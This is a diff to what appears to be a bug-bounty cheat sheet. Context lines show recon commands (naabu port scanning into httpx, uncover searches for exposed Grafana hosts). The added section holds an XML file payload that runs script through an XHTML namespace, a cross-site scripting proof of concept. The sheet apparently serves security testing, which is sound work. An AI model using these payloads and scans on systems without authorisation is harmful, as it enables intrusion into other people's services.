@@ -39,3 +39,16 @@ naabu -l /disk/output/example.com/host.txt  -tp 1000 -sa | httpx -retries 4 -tim
 ```
 uncover -shodan 'http.component:"Grafana"' -censys 'services.software.product=`Grafana`' -fofa 'app="Grafana"' -quake 'Grafana' -hunter 'Grafana' -zoomeye 'app:"Grafana"' -netlas 'Grafana'
 ``` 
+
+----------
+### XSS via the XML file
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns:html="http://w3.org/1999/xhtml">
+<html:script>prompt(document.domain);</html:script>
+</html>
+```
+
+
+---------------------
